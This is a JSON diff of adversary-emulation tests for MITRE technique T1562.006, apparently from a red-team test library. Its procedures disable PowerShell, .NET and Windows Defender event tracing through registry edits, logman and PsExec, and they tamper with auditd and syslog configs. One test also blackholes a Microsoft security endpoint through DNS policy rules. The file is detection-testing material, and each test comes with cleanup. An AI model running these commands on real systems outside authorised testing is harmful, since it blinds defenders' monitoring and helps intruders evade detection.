@@ -1,0 +1,294 @@
+{
+  "attack_technique": "T1562.006",
+  "display_name": "Impair Defenses: Indicator Blocking",
+  "atomic_tests": [
+    {
+      "name": "Auditing Configuration Changes on Linux Host",
+      "description": "Emulates modification of auditd configuration files",
+      "supported_platforms": [
+        "linux"
+      ],
+      "executor": {
+        "name": "bash",
+        "elevation_required": true,
+        "cleanup_command": "sed -i '$ d' /etc/audisp/#{audisp_config_file_name}\nif [ -f \"/etc/#{auditd_config_file_name}\" ];\nthen sed -i '$ d' /etc/#{auditd_config_file_name}\nelse sed -i '$ d' /etc/audit/#{auditd_config_file_name}\nfi\nsed -i '$ d' /etc/#{libaudit_config_file_name}",
+        "procedure": "sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}\nif [ -f \"/etc/#{auditd_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_1' /etc/#{auditd_config_file_name}\nelse sed -i '$ a #art_test_1562_006_1' /etc/audit/#{auditd_config_file_name}\nfi \nsed -i '$ a #art_test_1562_006_1' /etc/#{libaudit_config_file_name}"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "audisp_config_file_name",
+          "description": "The name of the audispd configuration file to be changed",
+          "type": "string",
+          "default": "audispd.conf"
+        },
+        {
+          "arg_name": "auditd_config_file_name",
+          "description": "The name of the auditd configuration file to be changed",
+          "type": "string",
+          "default": "auditd.conf"
+        },
+        {
+          "arg_name": "libaudit_config_file_name",
+          "description": "The name of the libaudit configuration file to be changed",
+          "type": "string",
+          "default": "libaudit.conf"
+        }
+      ],
+      "auto_generated_guid": "212cfbcf-4770-4980-bc21-303e37abd0e3"
+    },
+    {
+      "name": "Auditing Configuration Changes on FreeBSD Host",
+      "description": "Emulates modification of auditd configuration files",
+      "supported_platforms": [
+        "linux"
+      ],
+      "executor": {
+        "name": "sh",
+        "elevation_required": true,
+        "cleanup_command": "sed -i \"\" '/#art_test_1562_006_1/d' /etc/security/#{auditd_config_file_name}",
+        "procedure": "echo '#art_test_1562_006_1' >> /etc/security/#{auditd_config_file_name}"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "auditd_config_file_name",
+          "description": "The name of the auditd configuration file to be changed",
+          "type": "string",
+          "default": "audit_event"
+        }
+      ],
+      "auto_generated_guid": "cedaf7e7-28ee-42ab-ba13-456abd35d1bd"
+    },
+    {
+      "name": "Logging Configuration Changes on Linux Host",
+      "description": "Emulates modification of syslog configuration.",
+      "supported_platforms": [
+        "linux"
+      ],
+      "executor": {
+        "name": "bash",
+        "elevation_required": true,
+        "cleanup_command": "if [ -f \"/etc/#{syslog_config_file_name}\" ];\nthen sed -i '$ d' /etc/#{syslog_config_file_name}\nfi\nif [ -f \"/etc/#{rsyslog_config_file_name}\" ];\nthen sed -i '$ d' /etc/#{rsyslog_config_file_name}\nfi\nif [ -f \"/etc/syslog-ng/#{syslog_ng_config_file_name}\" ];\nthen sed -i '$ d' /etc/syslog-ng/#{syslog_ng_config_file_name}\nfi",
+        "procedure": "if [ -f \"/etc/#{syslog_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/#{syslog_config_file_name}\nfi\nif [ -f \"/etc/#{rsyslog_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/#{rsyslog_config_file_name}\nfi\nif [ -f \"/etc/syslog-ng/#{syslog_ng_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/#{syslog_ng_config_file_name}\nfi"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "syslog_config_file_name",
+          "description": "The name of the syslog configuration file to be changed",
+          "type": "string",
+          "default": "syslog.conf"
+        },
+        {
+          "arg_name": "rsyslog_config_file_name",
+          "description": "The name of the rsyslog configuration file to be changed",
+          "type": "string",
+          "default": "rsyslog.conf"
+        },
+        {
+          "arg_name": "syslog_ng_config_file_name",
+          "description": "The name of the syslog-ng configuration file to be changed",
+          "type": "string",
+          "default": "syslog-ng.conf"
+        }
+      ],
+      "auto_generated_guid": "7d40bc58-94c7-4fbb-88d9-ebce9fcdb60c"
+    },
+    {
+      "name": "Logging Configuration Changes on FreeBSD Host",
+      "description": "Emulates modification of syslog configuration.",
+      "supported_platforms": [
+        "linux"
+      ],
+      "executor": {
+        "name": "sh",
+        "elevation_required": true,
+        "cleanup_command": "if [ -f \"/etc/#{syslog_config_file_name}\" ];\nthen sed -i \"\" '/#art_test_1562_006_2/d' /etc/#{syslog_config_file_name}\nfi",
+        "procedure": "if [ -f \"/etc/#{syslog_config_file_name}\" ];\nthen echo '#art_test_1562_006_2' >> /etc/#{syslog_config_file_name}\nfi"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "syslog_config_file_name",
+          "description": "The name of the syslog configuration file to be changed",
+          "type": "string",
+          "default": "syslog.conf"
+        }
+      ],
+      "auto_generated_guid": "6b8ca3ab-5980-4321-80c3-bcd77c8daed8"
+    },
+    {
+      "name": "Disable Powershell ETW Provider - Windows",
+      "description": "This test was created to disable the Microsoft Powershell ETW provider by using the built-in Windows tool, logman.exe. This provider is used as a common source of telemetry in AV/EDR solutions.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "cleanup_command": "cmd /c \"#{ps_exec_location}\" -i -s cmd.exe /c logman update trace \"#{session}\" -p \"#{provider}\" -ets",
+        "procedure": "cmd /c \"#{ps_exec_location}\" -accepteula -i -s cmd.exe /c logman update trace \"#{session}\" --p \"#{provider}\" -ets"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "ps_exec_location",
+          "description": "Location of PSExec.",
+          "type": "string",
+          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\pstools\\PsExec.exe"
+        },
+        {
+          "arg_name": "session",
+          "description": "The session to disable.",
+          "type": "string",
+          "default": "EventLog-Application"
+        },
+        {
+          "arg_name": "provider",
+          "description": "The provider to disable.",
+          "type": "string",
+          "default": "Microsoft-Windows-Powershell"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "PSExec must be installed on the machine.",
+          "prereq_command": "if (Test-Path \"#{ps_exec_location}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PStools.zip\"\nexpand-archive -literalpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\PStools.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\pstools\" -force"
+        }
+      ],
+      "auto_generated_guid": "6f118276-121d-4c09-bb58-a8fb4a72ee84"
+    },
+    {
+      "name": "Disable .NET Event Tracing for Windows Via Registry (cmd)",
+      "description": "Disables ETW for the .NET Framework using the reg.exe utility to update the Windows registry",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "cleanup_command": "REG DELETE HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /f > nul 2>&1",
+        "procedure": "REG ADD HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /t REG_DWORD /d 0"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "8a4c33be-a0d3-434a-bee6-315405edbd5b"
+    },
+    {
+      "name": "Disable .NET Event Tracing for Windows Via Registry (powershell)",
+      "description": "Disables ETW for the .NET Framework using PowerShell to update the Windows registry",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "cleanup_command": "REG DELETE HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /f > $null 2>&1",
+        "procedure": "New-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType \"DWord\" -Force"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "19c07a45-452d-4620-90ed-4c34fffbe758"
+    },
+    {
+      "name": "LockBit Black - Disable the ETW Provider of Windows Defender -cmd",
+      "description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" /v Enabled /f >nul 2>&1",
+        "procedure": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" /v Enabled /t REG_DWORD /d 0 /f"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "f6df0b8e-2c83-44c7-ba5e-0fa4386bec41"
+    },
+    {
+      "name": "LockBit Black - Disable the ETW Provider of Windows Defender -Powershell",
+      "description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "cleanup_command": "Remove-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" -Name Enabled -Force -ErrorAction Ignore",
+        "procedure": "New-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" -Name Enabled  -PropertyType DWord -Value 0 -Force"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "69fc085b-5444-4879-8002-b24c8e1a3e02"
+    },
+    {
+      "name": "Disable .NET Event Tracing for Windows Via Environment Variable HKCU Registry - Cmd",
+      "description": "Disables ETW for the .NET Framework by setting the COMPlus_ETWEnabled environment variable to 0 in the HKCU registry using the reg.exe utility. In order for changes to take effect a logout might be required.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "cleanup_command": "REG DELETE HKCU\\Environment /v COMPlus_ETWEnabled /f > nul 2>&1",
+        "procedure": "REG ADD HKCU\\Environment /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "fdac1f79-b833-4bab-b4a1-11b1ed676a4b"
+    },
+    {
+      "name": "Disable .NET Event Tracing for Windows Via Environment Variable HKCU Registry - PowerShell",
+      "description": "Disables ETW for the .NET Framework by setting the COMPlus_ETWEnabled environment variable to 0 in the HKCU registry using PowerShell. In order for changes to take effect a logout might be required.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "cleanup_command": "Remove-ItemProperty -Path HKCU:\\Environment -Name COMPlus_ETWEnabled",
+        "procedure": "New-ItemProperty -Path HKCU:\\Environment -Name COMPlus_ETWEnabled -Value 0 -PropertyType \"String\" -Force"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "b42c1f8c-399b-47ae-8fd8-763181395fee"
+    },
+    {
+      "name": "Disable .NET Event Tracing for Windows Via Environment Variable HKLM Registry - Cmd",
+      "description": "Disables ETW for the .NET Framework by setting the COMPlus_ETWEnabled environment variable to 0 in the HKLM registry using the reg.exe utility. In order for changes to take effect a reboot might be required.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "cleanup_command": "REG DELETE \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v COMPlus_ETWEnabled /f > nul 2>&1",
+        "procedure": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "110b4281-43fe-405f-a184-5d8eaf228ebf"
+    },
+    {
+      "name": "Disable .NET Event Tracing for Windows Via Environment Variable HKLM Registry - PowerShell",
+      "description": "Disables ETW for the .NET Framework by setting the COMPlus_ETWEnabled environment variable to 0 in the HKLM registry using PowerShell. In order for changes to take effect a reboot might be required.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "cleanup_command": "Remove-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" -Name COMPlus_ETWEnabled",
+        "procedure": "New-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" -Name COMPlus_ETWEnabled -Value 0 -PropertyType \"String\" -Force"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "4d61779d-be7f-425c-b560-0cafb2522911"
+    },
+    {
+      "name": "Block Cybersecurity communication by leveraging Windows Name Resolution Policy Table",
+      "description": "Adversaries are redirecting DNS queries to an incorrect or malicious DNS server IP, thereby blocking legitimate communications and potentially compromising the security infrastructure. This atomic test aims to respond with 127.0.0.1 when a DNS query is made for endpoint.security.microsoft.com.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "cleanup_command": "try {\n    # Get all current NRPT rules\n        $DnsClientNrptRules = Get-DnsClientNrptRule | Where-Object { $_.Comment -eq 'Silenced by Name Resolution Policy Table' }\n    \n    # Remove each NRPT rule\n        foreach ($rule in $DnsClientNrptRules) {\n            Remove-DnsClientNrptRule -Name $rule.Name -Force\n        }\n    \n    # Clear DNS client cache\n    Clear-DnsClientCache\n    Write-Host \"All NRPT rules have been removed and the DNS cache has been cleared.\"\n}\n\ncatch {\n    Write-Host \"An error occurred: $_\"\n}\nClear-DnsClientCache",
+        "procedure": "Add-DnsClientNrptRule -Namespace \".endpoint.security.microsoft.com\" -NameServers 127.0.0.1 -Comment \"Silenced by Name Resolution Policy Table\"\nAdd-DnsClientNrptRule -Namespace \"endpoint.security.microsoft.com\" -NameServers 127.0.0.1 -Comment \"Silenced by Name Resolution Policy Table\"\nClear-DnsClientCache"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "1174b5df-2c33-490f-8854-f5eb80c907ca"
+    }
+  ]
+}
